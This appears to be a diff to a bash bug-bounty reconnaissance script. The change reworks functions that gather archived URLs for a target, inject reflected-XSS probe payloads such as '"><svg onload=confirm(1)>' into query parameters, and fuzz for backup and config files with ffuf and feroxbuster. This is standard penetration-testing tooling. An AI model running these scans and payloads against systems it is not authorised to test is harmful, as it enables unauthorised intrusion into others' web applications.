@@ -48,9 +48,10 @@ newRecon(){
   cat HTTPOK | grep 200 | awk -F " " '{print $1}' | anew 200HTTP
   cat HTTPOK | grep -E '40[0-4]' | grep -Ev 404 | awk -F " " '{print $1}' | anew 403HTTP
   cat HTTPOK | awk -F " " '{print $1}' | anew ALLHTTP
+  getdata
   screenshot
   dnsrecords
-  graphqldetect
+  # graphqldetect
   xsshunter
 }
 
@@ -153,7 +154,7 @@ getaliveAxiom() {
 }
 getdata() {
   echo "[+] Get all responses and save on roots folder"
-  cat ALLHTTP | fff -d 1 -S -o roots
+  cat ALLHTTP | fff -d 50 -S -o roots
 }
 
 graphqldetect() {
@@ -257,11 +258,15 @@ xsshunter() {
   # echo '[+] URL Bhedak'
   # cat domain | waybackurls | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew urlbhedak.txt
   # [ -s "urlbhedak.txt" ] && cat urlbhedak.txt | notify -silent -id xss
+  [ -s "domain" ] && cat domain | gauplus | uro | anew waybackdata
+  [ -s "domain" ] && cat domain | waybackurls | uro | anew waybackdata 
+  [ -s "waybackdata"] && cat waybackdata | gf xss | httpx -silent | anew xssvector
+  [ -s "waybackdata"] && cat waybackdata | kxss | awk '{print $9}' | anew xssvector
   echo '[+] Airixss xss'
-  [ -s "domain" ] && cat domain | gauplus | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew airixss.txt
+  [ -s "xssvector" ] && cat xssvector | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew airixss.txt
   [ -s "airixss.txt" ] && cat airixss.txt | notify -silent -id xss
   echo '[+] Freq xss'
-  [ -s "domain" ] && cat domain | gauplus | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew FreqXSS.txt
+  [ -s "xssvector" ] && cat xssvector | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew FreqXSS.txt
   [ -s "FreqXSS.txt" ] && cat FreqXSS.txt | notify -silent -id xss
   # [ -s "params" ] && cat params | hakcheckurl | grep 200 | awk '{print $2}' | anew xssvector
   # [ -s "xssvector" ] && cat xssvector | grep $Domain | kxss | awk -F " " '{print $9}' | anew XSS
@@ -421,7 +426,7 @@ fullreconAxiom() {
 }
 
 fullrecon() {
-  echo "[+] START RECON AT $(cat domain)" | notify -silent
+  echo "[+] START RECON AT $(cat domain)" | notify -silent -id tel
   #  getscope
   # rapid7search
   subdomainenum
@@ -443,6 +448,7 @@ fullrecon() {
   scanPortsAndNuclei
   massHakip2host
   nucauto
+  crawler
   xsshunter
   faviconEnum
   #Corstest
@@ -460,7 +466,7 @@ fullrecon() {
   #  getcms
   #  check4wafs
   #  bruteforce
-  echo "[+] END RECON AT $(cat domain)" | notify -silent
+  echo "[+] END RECON AT $(cat domain)" | notify -silent -id tel
 }
 
 redUrl() {
@@ -728,6 +734,10 @@ fufdir() {
 
 fufextension() {
   ffuf -u $1/FUZZ -mc 200,301,302,403,401 -t 150 -w $ToolsPath/ffuf_extension.txt -e .php,.asp,.aspx,.jsp,.py,.txt,.conf,.config,.bak,.backup,.swp,.old,.db,.sql,.json,.xml,.log,.zip
+}
+
+feroxdir() {
+  feroxbuster -u $1 -r -e --status-codes 200,301,302
 }
 
 fleetScan() {
